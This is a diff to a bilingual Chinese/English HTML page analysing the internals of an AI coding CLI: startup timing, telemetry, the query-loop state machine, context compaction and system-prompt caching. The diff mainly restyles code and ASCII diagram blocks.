@@ -93,6 +93,17 @@ th{background:var(--bg3);color:var(--fg);font-weight:600}td{color:var(--fg2)}
 .arr{stroke:var(--fg3);stroke-width:1.5;fill:none;marker-end:url(#ah)}
 .arr-a{stroke:var(--accent);stroke-width:2;fill:none;marker-end:url(#ah-a)}
 
+/* ASCII Art Diagrams */
+.ascii-diagram{margin:20px 0;overflow-x:auto;display:flex;justify-content:center}
+.ascii-diagram pre{
+  background:var(--bg2)!important;border:1px solid var(--border);border-radius:12px;
+  padding:24px 32px;font-family:'SF Mono','Fira Code','Cascadia Code',Consolas,monospace;
+  font-size:calc(var(--fs) * .8);line-height:1.5;color:var(--fg);
+  white-space:pre;display:inline-block;text-align:left;
+  box-shadow:0 2px 12px rgba(0,0,0,.06);
+}
+[data-theme="dark"] .ascii-diagram pre{box-shadow:0 2px 12px rgba(0,0,0,.3)}
+
 /* Chapter TOC */
 .ch-toc{background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:14px 18px;margin-bottom:24px;columns:2;column-gap:24px}
 .ch-toc a{display:block;color:var(--fg2);font-size:calc(var(--fs) * .82);padding:2px 0;break-inside:avoid;transition:color .1s}
@@ -716,7 +727,7 @@ if (isEnvTruthy(process.env.CLAUDE_CODE_REMOTE)) {
 </ol>
 <p><strong>上游代理中继的 fail-open 设计</strong>：CCR 环境的代理初始化使用 try-catch 包裹，失败时仅记录警告并继续。这是容错设计——代理失败不应阻止整个 CLI 启动。</p>
 <h5 id="00-cn-h17">1.3.2 initializeTelemetryAfterTrust() — 信任后遥测初始化</h5>
-<pre><code class="language-typescript">export function initializeTelemetryAfterTrust(): void {
+<div class="ascii-diagram"><pre>export function initializeTelemetryAfterTrust(): void {
   if (isEligibleForRemoteManagedSettings()) {
     // 特殊路径：SDK/headless + beta tracing → 提前初始化
     if (getIsNonInteractiveSession() &amp;&amp; isBetaTracingEnabled()) {
@@ -732,7 +743,7 @@ if (isEnvTruthy(process.env.CLAUDE_CODE_REMOTE)) {
   } else {
     void doInitializeTelemetry().catch(/*...*/);
   }
-}</code></pre>
+}</pre></div>
 <p><strong>双层初始化逻辑</strong>：对于远程管理设置的用户，遥测初始化需要等待远程设置到达（因为远程设置可能包含 OTEL endpoint 配置）。但 SDK + beta tracing 路径需要立即初始化以确保 tracer 在首个 query 之前就绪。<code>doInitializeTelemetry()</code> 内部使用 <code>telemetryInitialized</code> 布尔标志防止双重初始化。</p>
 <h5 id="00-cn-h18">1.3.3 setMeterState() — 遥测懒加载</h5>
 <pre><code class="language-typescript">async function setMeterState(): Promise&lt;void&gt; {
@@ -955,7 +966,7 @@ const SHOULD_PROFILE = DETAILED_PROFILING || STATSIG_LOGGING_SAMPLED</code></pre
 <p>这四个阶段覆盖了启动路径的关键段。<code>import_time</code> 测量模块评估耗时，是最容易膨胀的段——每添加一个新 import 都会增加这个值。</p>
 <hr/>
 <h3 id="00-cn-h34">二、启动时序图（阻塞/非阻塞标注版）</h3>
-<pre><code>时间轴 (近似值):
+<div class="ascii-diagram"><pre>时间轴 (近似值):
 
 0ms     cli.tsx 加载
         ├── [SYNC] 环境变量预设 (COREPACK, NODE_OPTIONS, 消融基线)    ~0ms
@@ -1092,7 +1103,7 @@ const SHOULD_PROFILE = DETAILED_PROFILING || STATSIG_LOGGING_SAMPLED</code></pre
             ├── refreshModelCapabilities()
             ├── settingsChangeDetector.initialize()
             ├── skillChangeDetector.initialize()
-            └── [ant-only] eventLoopStallDetector</code></pre>
+            └── [ant-only] eventLoopStallDetector</pre></div>
 <hr/>
 <h3 id="00-cn-h35">三、设计权衡分析</h3>
 <h4 id="00-cn-h36">3.1 模块顶层副作用 vs 纯模块</h4>
@@ -1149,9 +1160,9 @@ const SHOULD_PROFILE = DETAILED_PROFILING || STATSIG_LOGGING_SAMPLED</code></pre
 <h3 id="00-cn-h42">四、值得学习的模式</h3>
 <h4 id="00-cn-h43">4.1 Import-time Parallel Prefetch（导入时并行预取）</h4>
 <p>利用 ES 模块求值的确定性时序，在 import 链评估期间并行执行子进程。这是对 JavaScript 执行模型的深刻理解：</p>
-<pre><code>import A → A 的顶层代码执行（同步）
+<div class="ascii-diagram"><pre>import A → A 的顶层代码执行（同步）
 import B → B 的顶层代码执行（同步）
-... 135ms of synchronous module evaluation ...</code></pre>
+... 135ms of synchronous module evaluation ...</pre></div>
 <p>在这 135ms 内，被 <code>startMdmRawRead()</code> 和 <code>startKeychainPrefetch()</code> spawn 的子进程在操作系统级别并行运行。Node.js/Bun 的事件循环在模块求值完成前不会 poll，但子进程是独立进程，不受事件循环约束。</p>
 <h4 id="00-cn-h44">4.2 Memoize + Fire-and-Forget + Await-Later 模式</h4>
 <p>多个函数使用相同的三阶段模式：</p>
@@ -1739,7 +1750,7 @@ if (isEnvTruthy(process.env.CLAUDE_CODE_REMOTE)) {
 </ol>
 <p><strong>Fail-Open Design of Upstream Proxy Relay</strong>: The proxy initialization in the CCR environment is wrapped in try-catch, logging only a warning on failure and continuing. This is a fault-tolerant design — proxy failure should not prevent the entire CLI from starting.</p>
 <h5 id="00-en-h68">1.3.2 initializeTelemetryAfterTrust() — Post-Trust Telemetry Initialization</h5>
-<pre><code class="language-typescript">export function initializeTelemetryAfterTrust(): void {
+<div class="ascii-diagram"><pre>export function initializeTelemetryAfterTrust(): void {
   if (isEligibleForRemoteManagedSettings()) {
     // Special path: SDK/headless + beta tracing → early initialization
     if (getIsNonInteractiveSession() &amp;&amp; isBetaTracingEnabled()) {
@@ -1755,7 +1766,7 @@ if (isEnvTruthy(process.env.CLAUDE_CODE_REMOTE)) {
   } else {
     void doInitializeTelemetry().catch(/*...*/);
   }
-}</code></pre>
+}</pre></div>
 <p><strong>Dual-Layer Initialization Logic</strong>: For users with remote managed settings, telemetry initialization needs to wait for remote settings to arrive (because remote settings may contain OTEL endpoint configuration). However, the SDK + beta tracing path needs immediate initialization to ensure the tracer is ready before the first query. <code>doInitializeTelemetry()</code> internally uses a <code>telemetryInitialized</code> boolean flag to prevent double initialization.</p>
 <h5 id="00-en-h69">1.3.3 setMeterState() — Telemetry Lazy Loading</h5>
 <pre><code class="language-typescript">async function setMeterState(): Promise&lt;void&gt; {
@@ -1978,7 +1989,7 @@ const SHOULD_PROFILE = DETAILED_PROFILING || STATSIG_LOGGING_SAMPLED</code></pre
 <p>These four phases cover the critical segments of the startup path. <code>import_time</code> measures module evaluation duration and is the segment most prone to bloat — every new import added increases this value.</p>
 <hr/>
 <h3 id="00-en-h85">II. Startup Timing Diagram (Blocking/Non-Blocking Annotated Version)</h3>
-<pre><code>Timeline (approximate values):
+<div class="ascii-diagram"><pre>Timeline (approximate values):
 
 0ms     cli.tsx loads
         |-- [SYNC] Environment variable preset (COREPACK, NODE_OPTIONS, ablation baseline)    ~0ms
@@ -2115,7 +2126,7 @@ const SHOULD_PROFILE = DETAILED_PROFILING || STATSIG_LOGGING_SAMPLED</code></pre
             |-- refreshModelCapabilities()
             |-- settingsChangeDetector.initialize()
             |-- skillChangeDetector.initialize()
-            +-- [ant-only] eventLoopStallDetector</code></pre>
+            +-- [ant-only] eventLoopStallDetector</pre></div>
 <hr/>
 <h3 id="00-en-h86">III. Design Trade-off Analysis</h3>
 <h4 id="00-en-h87">3.1 Module Top-Level Side Effects vs. Pure Modules</h4>
@@ -2279,7 +2290,7 @@ type State = {
 }</code></pre>
 <p>关键设计：State 使用<strong>全量替换</strong>而非部分赋值。每个 <code>continue</code> 站点都创建一个完整的新 State 对象赋给 <code>state</code>。这带来三个好处：(1) 状态变迁的原子性——不会出现赋值到一半被中断的脏状态；(2) 每个 continue 路径的意图清晰可审计——看 State 构造就知道哪些字段被重置、哪些被保留；(3) <code>transition.reason</code> 字段让测试能断言走了哪条恢复路径。</p>
 <h4 id="01-cn-h106">1.2 完整状态机图</h4>
-<pre><code>                    ┌──────────────────────────────────────────────────────────┐
+<div class="ascii-diagram"><pre>                    ┌──────────────────────────────────────────────────────────┐
                     │                   while(true) 入口                       │
                     │  解构 state -&gt; 预处理管线(snip/micro/collapse/auto)       │
                     │  -&gt; 阻塞限制检查 -&gt; API 调用                             │
@@ -2322,7 +2333,7 @@ type State = {
                                           │   exceeded -&gt; return        │
                                           │                            │
                                           │ [7] next_turn continue     │
-                                          └────────────────────────────┘</code></pre>
+                                          └────────────────────────────┘</pre></div>
 <h4 id="01-cn-h107">1.3 七个 Continue 站点的精确触发条件与状态转移</h4>
 <table><thead><tr><th>#</th><th>transition.reason</th><th>触发条件</th><th>关键状态变化</th><th>代码位置</th></tr></thead><tbody><tr><td>1</td><td><code>collapse_drain_retry</code></td><td>PTL 413 错误 + CONTEXT_COLLAPSE 启用 + 上次不是 collapse_drain + drain committed > 0</td><td>messages 替换为 drained.messages；保留 hasAttemptedReactiveCompact</td><td>~1099-1115</td></tr>
 <p><tr><td>2</td><td><code>reactive_compact_retry</code></td><td>(PTL 413 或 media_size_error) + reactiveCompact 成功</td><td>messages 替换为 postCompactMessages；hasAttemptedReactiveCompact 设为 true</td><td>~1152-1165</td></tr></p>
@@ -2333,7 +2344,7 @@ type State = {
 <p><tr><td>7</td><td><code>next_turn</code></td><td>工具执行完毕，准备下一轮</td><td>messages = forQuery + assistant + toolResults；turnCount++；重置 MOT 和 reactive 状态</td><td>~1715-1727</td></tr></tbody></table></p>
 <p><strong>互斥与优先级关系</strong>：</p>
 <p>Continue 1-6 都在 <code>!needsFollowUp</code> 分支内（模型没有请求工具调用），它们的优先级是<strong>瀑布式</strong>的：</p>
-<pre><code>PTL 413? ──Yes──&gt; 尝试 collapse drain [1]
+<div class="ascii-diagram"><pre>PTL 413? ──Yes──&gt; 尝试 collapse drain [1]
                       │ drain 无效
                       ▼
                   尝试 reactive compact [2]
@@ -2355,7 +2366,7 @@ stop hooks ──blocking──&gt; [5] stop_hook_blocking (注入错误让模�
            ──prevent──&gt; return (直接终止)
 
 token budget ──continue──&gt; [6] token_budget_continuation
-             ──stop──&gt; return completed</code></pre>
+             ──stop──&gt; return completed</pre></div>
 <p>Continue 7 (<code>next_turn</code>) 在 <code>needsFollowUp === true</code> 的分支末尾，与 1-6 互斥——模型要么请求了工具调用（走 7），要么没有（走 1-6 中的某一个或 return）。</p>
 <h4 id="01-cn-h108">1.4 关键防御机制：hasAttemptedReactiveCompact 的跨站点守卫</h4>
 <p>这个布尔值的管理揭示了一个精巧的防死循环设计：</p>
@@ -2418,7 +2429,7 @@ if (message.type === 'assistant') {
 }</code></pre>
 <h5 id="01-cn-h113">恢复与暴露的决策点</h5>
 <p>流式循环结束后，如果 <code>needsFollowUp === false</code>：</p>
-<pre><code>withheld PTL?
+<div class="ascii-diagram"><pre>withheld PTL?
   ├── collapse drain 成功 -&gt; continue [1] (错误被吞掉)
   ├── reactive compact 成功 -&gt; continue [2] (错误被吞掉)
   └── 都失败 -&gt; yield lastMessage (错误暴露) + return
@@ -2430,7 +2441,7 @@ withheld MOT?
 
 withheld media?
   ├── reactive compact 成功 -&gt; continue [2]
-  └── 失败 -&gt; yield lastMessage + return</code></pre>
+  └── 失败 -&gt; yield lastMessage + return</pre></div>
 <h5 id="01-cn-h114">mediaRecoveryEnabled 的 hoist 策略</h5>
 <pre><code class="language-typescript">// query.ts:625-627
 const mediaRecoveryEnabled = reactiveCompact?.isReactiveCompactEnabled() ?? false</code></pre>
@@ -2552,7 +2563,7 @@ catch (innerError) {
 <h4 id="01-cn-h119">3.1 StreamingToolExecutor：API 还在流，工具先执行</h4>
 <p>StreamingToolExecutor 是一个带并发控制的工具执行器，核心设计是<strong>在 API 流式输出的同时，已完成的 tool_use block 立即开始执行</strong>，不必等待整个 API 响应结束。</p>
 <h5 id="01-cn-h120">生命周期：两阶段执行</h5>
-<pre><code>API 流式输出中:
+<div class="ascii-diagram"><pre>API 流式输出中:
   ├── 收到 tool_use block A -&gt; streamingToolExecutor.addTool(A)
   │   └── processQueue() -&gt; executeTool(A) 开始执行
   ├── 收到 tool_use block B -&gt; addTool(B)
@@ -2565,7 +2576,7 @@ catch (innerError) {
 
 API 流结束后:
   └── getRemainingResults() — 等待所有剩余工具完成
-      └── 异步 generator，用 Promise.race 等待</code></pre>
+      └── 异步 generator，用 Promise.race 等待</pre></div>
 <h5 id="01-cn-h121">并发控制模型</h5>
 <pre><code class="language-typescript">// StreamingToolExecutor.ts:129-135
 private canExecuteTool(isConcurrencySafe: boolean): boolean {
@@ -2601,10 +2612,10 @@ toolAbortController.signal.addEventListener('abort', () =&gt; {
   }
 })</code></pre>
 <p>三层控制器的层次关系：</p>
-<pre><code>queryLoop.abortController (用户中断 -&gt; 终止整个 turn)
+<div class="ascii-diagram"><pre>queryLoop.abortController (用户中断 -&gt; 终止整个 turn)
   └── siblingAbortController (Bash 错误 -&gt; 取消同级工具，不终止 turn)
         └── toolAbortController (单个工具的控制器)
-              └── 权限拒绝 -&gt; abort 向上冒泡到 queryLoop</code></pre>
+              └── 权限拒绝 -&gt; abort 向上冒泡到 queryLoop</pre></div>
 <p>注释中记录了一个 regression (#21056)：</p>
 <p>> <code>Permission-dialog rejection also aborts this controller ... Without bubble-up, ExitPlanMode "clear context + auto" sends REJECT_MESSAGE to the model instead of aborting</code></p>
 <p>权限拒绝必须冒泡到 query 层级，否则模型会收到一个 "rejected" 消息然后继续执行，而不是终止 turn。</p>
@@ -2623,12 +2634,12 @@ if (update.message.type === 'progress') {
 <p>Progress 消息（如 hook 执行进度）需要实时展示，不能等工具完成。设计用了一个 resolve callback 模式：<code>getRemainingResults</code> 在没有完成结果和 progress 时 await 一个 Promise，progress 到来时 resolve 这个 Promise 唤醒消费。</p>
 <h4 id="01-cn-h124">3.2 yield 管道如何传播到消费者</h4>
 <p>整个流式管道是三层 AsyncGenerator 的嵌套：</p>
-<pre><code>queryLoop() ─yield→ query() ─yield*→ QueryEngine.submitMessage() ─yield→ SDK/REPL
+<div class="ascii-diagram"><pre>queryLoop() ─yield→ query() ─yield*→ QueryEngine.submitMessage() ─yield→ SDK/REPL
 
 层级:
   queryLoop: 产生 StreamEvent | Message | ToolUseSummaryMessage
   query:     yield* queryLoop (透传) + 命令生命周期通知
-  submitMessage: 消费 query() 的输出，转换为 SDKMessage 格式</code></pre>
+  submitMessage: 消费 query() 的输出，转换为 SDKMessage 格式</pre></div>
 <p><code>query()</code> 对 <code>queryLoop()</code> 使用 <code>yield*</code> 委托（query.ts:230）：</p>
 <pre><code class="language-typescript">const terminal = yield* queryLoop(params, consumedCommandUuids)</code></pre>
 <p><code>yield*</code> 的语义是：queryLoop 的每次 yield 都直接传递给 query 的消费者，query 本身不处理这些中间值。只有 queryLoop return 的 Terminal 值被赋给 <code>terminal</code>。</p>
@@ -2646,7 +2657,7 @@ if (update.message.type === 'progress') {
 <hr/>
 <h3 id="01-cn-h125">四、5 层压缩管线深度分析</h3>
 <h4 id="01-cn-h126">4.1 管线执行顺序与互斥关系</h4>
-<pre><code>输入: messages (从 compact boundary 之后开始)
+<div class="ascii-diagram"><pre>输入: messages (从 compact boundary 之后开始)
   │
   ▼
 [L1] applyToolResultBudget()     ← 每条消息独立，按 tool_use_id 限制大小
@@ -2667,7 +2678,7 @@ if (update.message.type === 'progress') {
   │   如果 L4 已经足够 -&gt; no-op
   │   snipTokensFreed 参数修正阈值判断
   ▼
-输出: 压缩后的 messagesForQuery</code></pre>
+输出: 压缩后的 messagesForQuery</pre></div>
 <h5 id="01-cn-h127">关键设计权衡</h5>
 <p><strong>L4 在 L5 之前</strong>的原因（query.ts:430-438）：</p>
 <p>Context Collapse 是一种<strong>无损</strong>操作（保留细粒度的 fold/unfold 信息），而 Auto Compact 是<strong>有损</strong>操作（生成摘要丢失细节）。如果 collapse 已经把 token 数降到阈值以下，就不需要 auto compact——保留了更多可还原的上下文。</p>
@@ -2940,7 +2951,7 @@ type State = {
 }</code></pre>
 <p>Key design: State uses <strong>full replacement</strong> rather than partial assignment. Each <code>continue</code> site creates an entirely new State object assigned to <code>state</code>. This provides three benefits: (1) Atomicity of state transitions — no dirty state from partially completed assignments; (2) Clear and auditable intent for each continue path — inspecting the State construction reveals which fields are reset and which are preserved; (3) The <code>transition.reason</code> field allows tests to assert which recovery path was taken.</p>
 <h4 id="01-en-h155">1.2 Complete State Machine Diagram</h4>
-<pre><code>                    ┌──────────────────────────────────────────────────────────┐
+<div class="ascii-diagram"><pre>                    ┌──────────────────────────────────────────────────────────┐
                     │                   while(true) 入口                       │
                     │  解构 state -&gt; 预处理管线(snip/micro/collapse/auto)       │
                     │  -&gt; 阻塞限制检查 -&gt; API 调用                             │
@@ -2983,7 +2994,7 @@ type State = {
                                           │   exceeded -&gt; return        │
                                           │                            │
                                           │ [7] next_turn continue     │
-                                          └────────────────────────────┘</code></pre>
+                                          └────────────────────────────┘</pre></div>
 <h4 id="01-en-h156">1.3 Precise Trigger Conditions and State Transitions for the Seven Continue Sites</h4>
 <table><thead><tr><th>#</th><th>transition.reason</th><th>Trigger Condition</th><th>Key State Changes</th><th>Code Location</th></tr></thead><tbody><tr><td>1</td><td><code>collapse_drain_retry</code></td><td>PTL 413 error + CONTEXT_COLLAPSE enabled + last transition was not collapse_drain + drain committed > 0</td><td>messages replaced with drained.messages; hasAttemptedReactiveCompact preserved</td><td>~1099-1115</td></tr>
 <p><tr><td>2</td><td><code>reactive_compact_retry</code></td><td>(PTL 413 or media_size_error) + reactiveCompact succeeds</td><td>messages replaced with postCompactMessages; hasAttemptedReactiveCompact set to true</td><td>~1152-1165</td></tr></p>
@@ -2994,7 +3005,7 @@ type State = {
 <p><tr><td>7</td><td><code>next_turn</code></td><td>Tool execution complete, preparing next turn</td><td>messages = forQuery + assistant + toolResults; turnCount++; MOT and reactive state reset</td><td>~1715-1727</td></tr></tbody></table></p>
 <p><strong>Mutual Exclusion and Priority Relationships</strong>:</p>
 <p>Continue sites 1-6 are all within the <code>!needsFollowUp</code> branch (model did not request tool calls), and their priority follows a <strong>waterfall</strong> pattern:</p>
-<pre><code>PTL 413? ──Yes──&gt; Try collapse drain [1]
+<div class="ascii-diagram"><pre>PTL 413? ──Yes──&gt; Try collapse drain [1]
                       │ drain ineffective
                       ▼
                   Try reactive compact [2]
@@ -3016,7 +3027,7 @@ stop hooks ──blocking──&gt; [5] stop_hook_blocking (inject errors for mo
            ──prevent──&gt; return (terminate directly)
 
 token budget ──continue──&gt; [6] token_budget_continuation
-             ──stop──&gt; return completed</code></pre>
+             ──stop──&gt; return completed</pre></div>
 <p>Continue 7 (<code>next_turn</code>) is at the end of the <code>needsFollowUp === true</code> branch, mutually exclusive with 1-6 — the model either requested tool calls (take path 7) or didn't (take one of 1-6 or return).</p>
 <h4 id="01-en-h157">1.4 Key Defense Mechanism: Cross-Site Guard for hasAttemptedReactiveCompact</h4>
 <p>The management of this boolean reveals an elegant anti-infinite-loop design:</p>
@@ -3079,7 +3090,7 @@ if (message.type === 'assistant') {
 }</code></pre>
 <h5 id="01-en-h162">Decision Points for Recovery and Exposure</h5>
 <p>After the streaming loop ends, if <code>needsFollowUp === false</code>:</p>
-<pre><code>withheld PTL?
+<div class="ascii-diagram"><pre>withheld PTL?
   ├── collapse drain succeeds -&gt; continue [1] (error swallowed)
   ├── reactive compact succeeds -&gt; continue [2] (error swallowed)
   └── both fail -&gt; yield lastMessage (error exposed) + return
@@ -3091,7 +3102,7 @@ withheld MOT?
 
 withheld media?
   ├── reactive compact succeeds -&gt; continue [2]
-  └── fails -&gt; yield lastMessage + return</code></pre>
+  └── fails -&gt; yield lastMessage + return</pre></div>
 <h5 id="01-en-h163">Hoist Strategy for mediaRecoveryEnabled</h5>
 <pre><code class="language-typescript">// query.ts:625-627
 const mediaRecoveryEnabled = reactiveCompact?.isReactiveCompactEnabled() ?? false</code></pre>
@@ -3213,7 +3224,7 @@ catch (innerError) {
 <h4 id="01-en-h168">3.1 StreamingToolExecutor: Tools Execute While the API Is Still Streaming</h4>
 <p>StreamingToolExecutor is a tool executor with concurrency control. The core design is that <strong>completed tool_use blocks begin execution immediately during API streaming output</strong>, without waiting for the entire API response to finish.</p>
 <h5 id="01-en-h169">Lifecycle: Two-Phase Execution</h5>
-<pre><code>API 流式输出中:
+<div class="ascii-diagram"><pre>API 流式输出中:
   ├── 收到 tool_use block A -&gt; streamingToolExecutor.addTool(A)
   │   └── processQueue() -&gt; executeTool(A) 开始执行
   ├── 收到 tool_use block B -&gt; addTool(B)
@@ -3226,7 +3237,7 @@ catch (innerError) {
 
 API 流结束后:
   └── getRemainingResults() — 等待所有剩余工具完成
-      └── 异步 generator，用 Promise.race 等待</code></pre>
+      └── 异步 generator，用 Promise.race 等待</pre></div>
 <h5 id="01-en-h170">Concurrency Control Model</h5>
 <pre><code class="language-typescript">// StreamingToolExecutor.ts:129-135
 private canExecuteTool(isConcurrencySafe: boolean): boolean {
@@ -3262,10 +3273,10 @@ toolAbortController.signal.addEventListener('abort', () =&gt; {
   }
 })</code></pre>
 <p>Hierarchy of the three-layer controllers:</p>
-<pre><code>queryLoop.abortController (用户中断 -&gt; 终止整个 turn)
+<div class="ascii-diagram"><pre>queryLoop.abortController (用户中断 -&gt; 终止整个 turn)
   └── siblingAbortController (Bash 错误 -&gt; 取消同级工具，不终止 turn)
         └── toolAbortController (单个工具的控制器)
-              └── 权限拒绝 -&gt; abort 向上冒泡到 queryLoop</code></pre>
+              └── 权限拒绝 -&gt; abort 向上冒泡到 queryLoop</pre></div>
 <p>A regression (#21056) documented in the comments:</p>
 <p>> <code>Permission-dialog rejection also aborts this controller ... Without bubble-up, ExitPlanMode "clear context + auto" sends REJECT_MESSAGE to the model instead of aborting</code></p>
 <p>Permission rejection must bubble up to the query level; otherwise the model receives a "rejected" message and continues execution instead of terminating the turn.</p>
@@ -3284,12 +3295,12 @@ if (update.message.type === 'progress') {
 <p>Progress messages (such as hook execution progress) need to be displayed in real time and cannot wait for tool completion. The design uses a resolve callback pattern: <code>getRemainingResults</code> awaits a Promise when there are no completed results or progress messages; when progress arrives, it resolves this Promise to wake up consumption.</p>
 <h4 id="01-en-h173">3.2 How the yield Pipeline Propagates to Consumers</h4>
 <p>The entire streaming pipeline is a nesting of three AsyncGenerator layers:</p>
-<pre><code>queryLoop() ─yield→ query() ─yield*→ QueryEngine.submitMessage() ─yield→ SDK/REPL
+<div class="ascii-diagram"><pre>queryLoop() ─yield→ query() ─yield*→ QueryEngine.submitMessage() ─yield→ SDK/REPL
 
 层级:
   queryLoop: 产生 StreamEvent | Message | ToolUseSummaryMessage
   query:     yield* queryLoop (透传) + 命令生命周期通知
-  submitMessage: 消费 query() 的输出，转换为 SDKMessage 格式</code></pre>
+  submitMessage: 消费 query() 的输出，转换为 SDKMessage 格式</pre></div>
 <p><code>query()</code> uses <code>yield*</code> delegation for <code>queryLoop()</code> (query.ts:230):</p>
 <pre><code class="language-typescript">const terminal = yield* queryLoop(params, consumedCommandUuids)</code></pre>
 <p>The semantics of <code>yield*</code> are: every yield from queryLoop is passed directly to query's consumer; query itself does not handle these intermediate values. Only the Terminal value returned by queryLoop is assigned to <code>terminal</code>.</p>
@@ -3307,7 +3318,7 @@ if (update.message.type === 'progress') {
 <hr/>
 <h3 id="01-en-h174">IV. In-Depth Analysis of the 5-Layer Compaction Pipeline</h3>
 <h4 id="01-en-h175">4.1 Pipeline Execution Order and Mutual Exclusion Relationships</h4>
-<pre><code>输入: messages (从 compact boundary 之后开始)
+<div class="ascii-diagram"><pre>输入: messages (从 compact boundary 之后开始)
   │
   ▼
 [L1] applyToolResultBudget()     ← 每条消息独立，按 tool_use_id 限制大小
@@ -3328,7 +3339,7 @@ if (update.message.type === 'progress') {
   │   如果 L4 已经足够 -&gt; no-op
   │   snipTokensFreed 参数修正阈值判断
   ▼
-输出: 压缩后的 messagesForQuery</code></pre>
+输出: 压缩后的 messagesForQuery</pre></div>
 <h5 id="01-en-h176">Key Design Trade-offs</h5>
 <p><strong>Reason for L4 before L5</strong> (query.ts:430-438):</p>
 <p>Context Collapse is a <strong>lossless</strong> operation (preserving fine-grained fold/unfold information), while Auto Compact is a <strong>lossy</strong> operation (generating summaries that lose detail). If collapse already brings the token count below the threshold, auto compact is unnecessary — preserving more recoverable context.</p>
@@ -4046,7 +4057,7 @@ if (
 <h3 id="02-cn-h231">6. Section 缓存机制（systemPromptSections.ts）</h3>
 <h4 id="02-cn-h232">6.1 实现</h4>
 <p>这是一个经典的 <strong>compute-once + manual invalidation</strong> 模式：</p>
-<pre><code class="language-typescript">// 缓存存储在全局 STATE 中
+<div class="ascii-diagram"><pre>// 缓存存储在全局 STATE 中
 STATE.systemPromptSectionCache: Map&lt;string, string | null&gt;
 
 // 普通 section：cacheBreak: false
@@ -4071,16 +4082,16 @@ async function resolveSystemPromptSections(sections) {
       return value
     }),
   )
-}</code></pre>
+}</pre></div>
 <p><strong>关键细节</strong>：<code>DANGEROUS_uncachedSystemPromptSection</code> 的 <code>_reason</code> 参数是 <strong>纯文档用途</strong>（参数名前缀 <code>_</code> 表示未使用）。它强制开发者在使用时解释为什么需要每轮重算，作为代码审查的警告。</p>
 <h4 id="02-cn-h233">6.2 缓存生命周期</h4>
-<pre><code>Session Start → 首次 API 调用 → 所有 section 首次计算 → 缓存 → 后续调用读缓存
+<div class="ascii-diagram"><pre>Session Start → 首次 API 调用 → 所有 section 首次计算 → 缓存 → 后续调用读缓存
                                                               ↓
                             /clear 或 /compact → clearSystemPromptSections()
                                                   → STATE.systemPromptSectionCache.clear()
                                                   → clearBetaHeaderLatches()
                                                               ↓
-                                              下次 API 调用 → 全部重新计算</code></pre>
+                                              下次 API 调用 → 全部重新计算</pre></div>
 <p>注意 <code>/clear</code> 和 <code>/compact</code> 同时清除 beta header latches（AFK/fast-mode/cache-editing），确保新对话从干净状态开始。</p>
 <h4 id="02-cn-h234">6.3 当前 Section 缓存策略一览</h4>
 <table><thead><tr><th>Section Name</th><th>缓存策略</th><th>理由</th></tr></thead><tbody><tr><td>session_guidance</td><td>compute-once</td><td>工具集在 session 内稳定</td></tr>
@@ -4098,7 +4109,7 @@ async function resolveSystemPromptSections(sections) {
 <p><tr><td>brief</td><td>compute-once</td><td>Brief mode 配置 session-stable</td></tr></tbody></table></p>
 <hr/>
 <h3 id="02-cn-h235">7. Prompt 优先级路由（buildEffectiveSystemPrompt）</h3>
-<pre><code>buildEffectiveSystemPrompt()
+<div class="ascii-diagram"><pre>buildEffectiveSystemPrompt()
   │
   ├── overrideSystemPrompt?  ──→ [overrideSystemPrompt]  (loop mode 等)
   │
@@ -4110,7 +4121,7 @@ async function resolveSystemPromptSections(sections) {
   │
   ├── customSystemPrompt?  ──→ [customSystemPrompt, appendSystemPrompt?]
   │
-  └── default  ──→ [...defaultSystemPrompt, appendSystemPrompt?]</code></pre>
+  └── default  ──→ [...defaultSystemPrompt, appendSystemPrompt?]</pre></div>
 <p><strong>Proactive mode 的特殊处理</strong>：agent prompt 是 <strong>追加</strong> 而非替换。这是因为 proactive 的默认 prompt 已经是精简的自主 agent prompt（identity + memory + env + proactive section），agent 在此基础上添加领域指令 — 与 teammates 的模式相同。</p>
 <hr/>
 <h3 id="02-cn-h236">8. 与其他 LLM Prompt 工程的对比</h3>
@@ -4132,7 +4143,7 @@ async function resolveSystemPromptSections(sections) {
 <p><strong>DANGEROUS_ 命名约定</strong>：显式的恐惧命名（<code>DANGEROUS_uncachedSystemPromptSection</code>）是一种 API 设计策略 — 通过让错误使用变得不舒服来减少滥用。目前只有 MCP Instructions 使用此标记。</p>
 <hr/>
 <h3 id="02-cn-h239">9. 数据流全景</h3>
-<pre><code>getSystemPrompt(tools, model, dirs, mcpClients)
+<div class="ascii-diagram"><pre>getSystemPrompt(tools, model, dirs, mcpClients)
   │
   ├── [Static] getSimpleIntroSection → getSimpleSystemSection → getSimpleDoingTasksSection
   │            → getActionsSection → getUsingYourToolsSection → getSimpleToneAndStyleSection
@@ -4169,7 +4180,7 @@ QueryEngine.ts → query.ts
         │     ├── API call                         → Messages API
         │     └── [Post-call] checkResponseForCacheBreak()  → Phase 2 attribution
         │
-        └── logAPISuccessAndDuration()</code></pre>
+        └── logAPISuccessAndDuration()</pre></div>
 <hr/>
 <h3 id="02-cn-h240">关键发现总结</h3>
 <ol>
@@ -4657,7 +4668,7 @@ if (
 <h3 id="02-en-h271">6. Section Caching Mechanism (systemPromptSections.ts)</h3>
 <h4 id="02-en-h272">6.1 Implementation</h4>
 <p>This is a classic <strong>compute-once + manual invalidation</strong> pattern:</p>
-<pre><code class="language-typescript">// Cache stored in global STATE
+<div class="ascii-diagram"><pre>// Cache stored in global STATE
 STATE.systemPromptSectionCache: Map&lt;string, string | null&gt;
 
 // Normal section: cacheBreak: false
@@ -4682,16 +4693,16 @@ async function resolveSystemPromptSections(sections) {
       return value
     }),
   )
-}</code></pre>
+}</pre></div>
 <p><strong>Key detail</strong>: The <code>_reason</code> parameter of <code>DANGEROUS_uncachedSystemPromptSection</code> is <strong>purely for documentation purposes</strong> (the <code>_</code> prefix on the parameter name indicates it is unused). It forces developers to explain why per-turn recomputation is needed when using it, serving as a warning during code review.</p>
 <h4 id="02-en-h273">6.2 Cache Lifecycle</h4>
-<pre><code>Session Start → First API call → All sections computed for the first time → Cached → Subsequent calls read from cache
+<div class="ascii-diagram"><pre>Session Start → First API call → All sections computed for the first time → Cached → Subsequent calls read from cache
                                                               ↓
                             /clear or /compact → clearSystemPromptSections()
                                                   → STATE.systemPromptSectionCache.clear()
                                                   → clearBetaHeaderLatches()
                                                               ↓
-                                              Next API call → All recomputed</code></pre>
+                                              Next API call → All recomputed</pre></div>
 <p>Note that <code>/clear</code> and <code>/compact</code> also clear beta header latches (AFK/fast-mode/cache-editing), ensuring a clean state for new conversations.</p>
 <h4 id="02-en-h274">6.3 Current Section Cache Strategy Overview</h4>
